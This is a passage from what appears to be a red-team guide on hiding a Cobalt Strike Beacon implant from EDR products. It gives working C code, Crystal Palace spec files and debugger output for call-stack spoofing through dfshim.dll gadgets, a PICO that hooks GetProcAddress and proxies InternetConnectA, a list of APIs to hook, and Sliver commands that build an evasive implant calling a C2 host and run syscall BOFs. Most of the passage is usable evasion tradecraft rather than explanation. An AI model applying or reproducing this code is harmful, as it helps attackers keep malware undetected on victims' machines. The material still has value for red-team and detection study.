The synthetic stacks look clean at a glance, but the gadget frame inside KernelBase doesn't always match what a legitimate call would produce. EDRs that perform stack validation flag this. Take a real call to LoadLibraryA — the natural chain looks like:

# Child-SP          RetAddr               Call Site
00 00000000`00c7ea58 00007ffb`26d62ac6     ntdll!LdrLoadDll
01 00000000`00c7ea60 00007ffb`26e453dd     KERNELBASE!LoadLibraryExW+0xe6
02 00000000`00c7ead0 00007ffb`26eb3caa     KERNELBASE!LoadLibraryA+0x8d
03 0000006f`303feb10 00007ffa`7d18e8d7     KERNELBASE!GetConsoleAliasInternal+0xda
04 0000006f`303fec00 00007ffa`7d2bc34c     KERNEL32!BaseThreadInitThunk+0x17
05 0000006f`303fec30 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

Walking back from LoadLibraryExW using uf shows it calls into LdrLoadDll:

0:000> uf KernelBase!LoadLibraryExW
[...snip...]

00007ffb`26d62abf 48ff15e20c2800  call    qword ptr [KERNELBASE!_imp_LdrLoadDll (00007ffb`26fe37a8)]
00007ffb`26d62ac6 0f1f440000      nop     dword ptr [rax+rax]

And LoadLibraryA calls into LoadLibraryExW:

0:000> uf KernelBase!LoadLibraryA
[...snip...]

00007ffb`26e453d8 e803d6f1ff      call    KERNELBASE!LoadLibraryExW (00007ffb`26d629e0)
00007ffb`26e453dd 488d4c2420      lea     rcx,[rsp+20h]

Compare that to the spoofed stack: the gadget Draugr picked sits at GetConsoleAliasInternal+0xda, which is the jmp qword ptr [rbx] instruction. That instruction is reachable in normal control flow, but only as part of an unrelated function — nothing legitimately calls LoadLibraryA from inside GetConsoleAliasInternal:

0:002> u 00007ffb`26eb3caa
KERNELBASE!GetConsoleAliasInternal+0xda:
00007ffb`26eb3caa ff23            jmp     qword ptr [rbx]

An EDR that disassembles backwards from the gadget address sees a cmp/jne instead of a call, immediately exposing the spoof:

0:002> uf KERNELBASE!GetConsoleAliasInternal
[...snip...]

00007ffb`26eb3ca4 0f1f440000      nop     dword ptr [rax+rax]
00007ffb`26eb3ca9 81ff230000c0    cmp     edi,0C0000023h
00007ffb`26eb3caf 7504            jne     KERNELBASE!GetConsoleAliasInternal+0xe5 (00007ffb`26eb3cb5)

The fix is to use a gadget from a module that does legitimately call the target API. dfshim.dll is loaded by .NET assemblies and contains a real call to LoadLibraryA, so pivot through that instead:

// frame->Gadget = KERNEL32$GetModuleHandleA ( "KernelBase.dll" );
frame->Gadget = LoadLibraryA ( "dfshim.dll" );

Note that init_frame_info itself now needs LoadLibraryA, so we can't hook that particular call site. Crystal Palace's preserve command exempts a specific function from the hook attachment:

attach "KERNEL32$VirtualAlloc"   "_VirtualAlloc"
attach "KERNEL32$VirtualProtect" "_VirtualProtect"
attach "KERNEL32$LoadLibraryA"   "_LoadLibraryA"

# don't hook LoadLibraryA in init_frame_info
preserve "KERNEL32$LoadLibraryA" "init_frame_info"

The gadget search in find_gadget also needs to filter for gadgets that have a call instruction (opcode 0xE8) five bytes before them. This guarantees backward disassembly produces a plausible call chain:

/* x64 opcodes are ff 23 */
if ( ( ( PBYTE ) mod_text_section ) [ i ] == 0xFF && ( ( PBYTE ) mod_text_section ) [ i + 1 ] == 0x23 )
{
    /* check for a call before the gadget */
    if ( ( ( PBYTE ) mod_text_section ) [ i - 5 ] == 0xE8 )
    {
        gadget_list [ counter ] = ( PVOID ) ( ( UINT_PTR ) mod_text_section + i );
        counter++;

        if ( counter == 15 ) {
            break;
        }
    }
}

After rebuilding, the spoofed call to LoadLibraryA now appears to come from inside dfshim!CCSDirect::Initialize, which is consistent with how that DLL actually behaves at runtime:

# Child-SP          RetAddr               Call Site
00 00000004`0afff018 00007ffa`90fbdf4e     KERNELBASE!LoadLibraryA
01 00000004`0afff020 00007ffb`4774e8d7     dfshim!CCSDirect::Initialize+0x37a
02 00000004`0afff160 00007ffb`47d2c53c     KERNEL32!BaseThreadInitThunk+0x17
03 00000004`0afff190 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

One last polish: prefer GetModuleHandleA over LoadLibraryA when dfshim.dll is already loaded. This avoids an unnecessary library load that itself could be telemetry-rich:

PVOID dfshim = KERNEL32$GetModuleHandleA ( "dfshim.dll" );

if ( dfshim != NULL ) {
    frame->Gadget = dfshim;
} else {
    frame->Gadget = LoadLibraryA ( "dfshim.dll" );
}

4. Runtime Evasion

What is runtime evasion? Load-time evasion (Chapter 3) got Beacon into memory without detection. But Beacon doesn't just sit there — it wakes up periodically to check in with the C2 server, execute commands, and go back to sleep. Every time it does something, it creates runtime artifacts that EDRs can detect. Runtime evasion keeps Beacon hidden while it's operating.

Beacon is exposed to two main runtime detections:

  • Unbacked API calls: When Beacon calls Windows APIs (to send HTTP requests, open processes, etc.), the return address on the call stack points back to Beacon's memory — which isn't backed by any legitimate DLL on disk. EDRs inspect call stacks and flag calls originating from "unbacked" (non-file-backed) memory regions.
  • Static signatures in memory: Even though the Beacon DLL was encrypted on disk, it's decrypted in memory to run. Memory scanners look for known byte patterns (signatures) of Beacon's code and data structures.

Cobalt Strike's native answer is Sleepmask (obfuscates Beacon's memory between check-ins) and BeaconGate (API proxy for Beacon that pushes calls through Sleepmask for evasions like stack spoofing). We're not using the CS kits, so we implement equivalent tradecraft via a Crystal Palace PICO loaded alongside the Beacon DLL.

PICO is short for position-independent code object, and are Crystal Palace's convention for running COFFs in-memory. They are like BOFs (Beacon Object Files), but without the Beacon-specific API.

Sliver equivalent: Sliver has no equivalent of PICO, Sleepmask, or BeaconGate as user-extensible kits. The tradecraft has to come from one of these sources instead:

SurfaceSliver answer
Sleep memory obfuscation--evasion build flag (basic), or a custom foliage-style sleep mask BOF loaded via execute-bof. Beacon-mode implants check in on jitter intervals; obfuscation between checks is not built in.
API proxy / call-stack spoofingNo native gate. Use execute-bof to run a BOF that performs the sensitive call with spoofed frames (e.g. CallStackSpoofer-style code repackaged as a BOF).
Hooked IAT / API redirectionImplemented in the implant Go source. Modify implant/sliver/sliver.go and the syscall wrappers if you maintain a fork.

4.1 Call Stacks

A PICO is loaded alongside the Beacon DLL and contains hooking and evasion tradecraft. It can have a go entry point (like a loader) or expose multiple named functions. Since this PICO needs to perform several setup steps over Beacon's lifetime, we'll use individual exported functions.

The first job is to hook GetProcAddress. The PICO defines an internal _GetProcAddress that the loader will install over the real function pointer before loading the Beacon DLL. When Beacon later resolves APIs like InternetConnectA or OpenProcess, our wrapper returns the hooked address instead:

#include <windows.h>
#include "tcg.h"

/**
 * All GetProcAddress calls will use this function.
 * The __resolve_hook intrinsic is controlled in the spec file.
 */
FARPROC WINAPI _GetProcAddress ( HMODULE hModule, LPCSTR lpProcName )
{
    /* lpProcName may be an ordinal */
    if ( ( ULONG_PTR ) lpProcName >> 16 == 0 )
    {
        /* just resolve normally */
        return GetProcAddress ( hModule, lpProcName );
    }

    FARPROC result = __resolve_hook ( ror13hash ( lpProcName ) );

    /*
     * result may still be NULL if
     * it wasn't hooked in the spec
     */
    if ( result != NULL ) {
        return result;
    }

    return GetProcAddress ( hModule, lpProcName );
}

/**
 * This will overwrite the function pointer for GetProcAddress.
 */
void setup_hooks ( IMPORTFUNCS * funcs )
{
    funcs->GetProcAddress = ( __typeof__ ( GetProcAddress ) * ) _GetProcAddress;
}

The hooks are wired up in pico.spec. The addhook command pre-generates ROR13 hashes for each entry and patches them into the PICO at link-time:

x64:
    load "bin/pico.x64.o"         # loader the pico COFF
        make object               # turn it into a PICO

    load "bin/hooks.x64.o"        # merge the hooks COFF
        merge

    load "bin/spoof.x64.o"        # merge the spoof COFF
        merge

    load "bin/draugr.x64.bin"     # link the draugr stub
        linkfunc "draugr_stub"

    mergelib "../libtcg.x64.zip"  # we want libtcg too
      
    # export setup_hooks
    exportfunc "setup_hooks"  "__tag_setup_hooks"

    # add hooks
    addhook "WININET$InternetConnectA" "_InternetConnectA"
    # add as many hooks as you want #

    export

After linking, the _GetProcAddress function contains an inline switch on the hash. For example, 0x1E4BE80E is the ROR13 hash for InternetConnectA:

000000000000003A E8DF140000        call    ror13hash
000000000000003F 89C1              mov     %eax,%ecx
0000000000000041 81F90EE84B1E      cmp     $0x1E4B`E80E,%ecx
0000000000000047 7509              jne     0x0000`0000`0000`0052
0000000000000049 488D0521020000    lea     _InternetConnectA,%rax

Each hooked API needs a corresponding implementation in hooks.c. The hook packs its arguments into a FUNCTION_CALL and pushes the call through spoof_call, which routes it through the Draugr stub from the previous chapter:

#include <windows.h>
#include <wininet.h>
#include "spoof.h"
#include "tcg.h"

DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA ( HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR );

HINTERNET WINAPI _InternetConnectA ( HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext )
{
    FUNCTION_CALL call = { 0 };
    
    call.function = ( PVOID ) ( WININET$InternetConnectA );
    call.argc     = 8;

    call.args [ 0 ] = spoof_arg ( hInternet );
    call.args [ 1 ] = spoof_arg ( lpszServerName );
    call.args [ 2 ] = spoof_arg ( nServerPort );
    call.args [ 3 ] = spoof_arg ( lpszUserName );
    call.args [ 4 ] = spoof_arg ( lpszPassword );
    call.args [ 5 ] = spoof_arg ( dwService );
    call.args [ 6 ] = spoof_arg ( dwFlags );
    call.args [ 7 ] = spoof_arg ( dwContext );

    return ( HINTERNET ) spoof_call ( &call );
}

The loader itself needs to know how to load the PICO. Embed the PICO bytes in a custom section, define a struct describing its memory layout, and create a typedef for setup_hooks:

char _PICO_ [ 0 ] __attribute__ ( ( section ( "pico" ) ) );

typedef struct {
    char data [ 4096 ];
    char code [ 16384 ];
} PICO;

int __tag_setup_hooks ( );

typedef void ( * SETUP_HOOKS ) ( IMPORTFUNCS * funcs );

Inside go, allocate RW memory for the PICO, use PicoLoad to copy its data and code sections in, flip the code section to RX, then call setup_hooks to install _GetProcAddress over the real function pointer. Beacon is loaded after this so that its imports resolve through our hook:

void go ( )
{
    /* populate funcs */
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    /* get the pico */
    char * pico_src = GETRESOURCE ( _PICO_ );

    /* allocate memory for it */
    PICO * pico_dst = ( PICO * ) KERNEL32$VirtualAlloc ( NULL, sizeof ( PICO ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* load it into memory */
    PicoLoad ( &funcs, pico_src, pico_dst->code, pico_dst->data );

    /* make code section RX */
    DWORD old_protect;
    KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );

    /* call setup_hooks to overwrite funcs.GetProcAddress */
    ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_hooks ( ) ) ) ( &funcs );
                                                     
    /* now we can load the DLL */
    ...
}

Finally, loader.spec needs to run pico.spec and link the resulting PICO into the loader PIC:

x64:
    load "bin/loader.x64.o"
        make pic +gofirst +optimize

    run "services.spec"
    
    load "bin/hooks.x64.o"
        merge
    
    load "bin/spoof.x64.o"
        merge

    load "bin/draugr.x64.bin"
        linkfunc "draugr_stub"

    attach   "KERNEL32$VirtualAlloc"   "_VirtualAlloc"
    attach   "KERNEL32$VirtualProtect" "_VirtualProtect"
    attach   "KERNEL32$LoadLibraryA"   "_LoadLibraryA"
    preserve "KERNEL32$LoadLibraryA"   "init_frame_info"

    run "pico.spec"  # process the pico
        link "pico"  # link it to the loader

    push $DLL
        link "dll"
    
    export

With everything wired up, Beacon's InternetConnectA calls are now stack spoofed via dfshim:

# Child-SP          RetAddr               Call Site
00 00000000`00f1f6b8 00007ffa`916232ea     WININET!InternetConnectA
01 00000000`00f1f6c0 00007ffb`4774e8d7     dfshim!BCL::HashTable::CTable<CCdfTableBuilder<CCdfIdentityDefinitionTableTraits,CCdfTableBuilder<CCdfStringTableTraits<0>,CCdfTableBuilder<CCdfUlongTableTraits,CCdfObjectHoster<Windows::Cms::Rtl::_CMS_CATEGORY_INSTANCE>,CCdfUlongTableWriterTraits>,CCdfTableWriterTraits>,CCdfTableWriterTraits>::CTableTraits>::CBucketChain::FindOrInsertIfNotPresent<Windows::Isolation::Rtl::_DEFINITION_IDENTITY,int>+0x1ea
02 00000000`00f1f740 00007ffb`47d2c53c     KERNEL32!BaseThreadInitThunk+0x17
03 00000000`00f1f770 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

To extend coverage, add a hook function to hooks.c and a matching addhook entry in pico.spec. The following APIs are reasonable defaults to hook:

  • InternetOpenA, InternetConnectA — C2 channel
  • CreateProcessA, CreateRemoteThread, CreateThread, ResumeThread — process & thread creation
  • OpenProcess, OpenThread, DuplicateHandle, CloseHandle — handle ops
  • VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtect, VirtualQuery — memory allocation
  • CreateFileMappingA, MapViewOfFile, UnmapViewOfFile — section mapping
  • ReadProcessMemory, GetThreadContext, SetThreadContext — remote process manipulation
  • CoCreateInstance, LoadLibraryA, Sleep — misc.

4.2 Indirect Syscalls

Hooking VirtualAlloc still goes through user-mode KernelBase, so any EDR with its own user-mode hooks will see the call. To bypass user-mode hooks entirely, we issue the underlying syscall directly. We'll integrate RecycledGate by thefLink, which uses the Hell's/Halo's/Tartarus' Gate family of techniques to dynamically resolve the SSN (System Service Number) and a clean syscall; ret gadget at runtime.

Sliver equivalent: Sliver's --evasion build flag enables built-in indirect syscalls (via the banned package that uses go-donut-style trampolines). Coverage is limited compared to a hand-rolled RecycledGate, so most operators layer a BOF on top:

# Build implant with indirect-syscall stubs
sliver > generate --http https://c2.example.com --evasion --os windows --arch amd64 --save /tmp/

# Or run a syscall-aware BOF at runtime via the armory
sliver > armory install inline-execute-pe
sliver (SESSION) > execute-bof /opt/bofs/NtCreateFileSyscall.x64.o
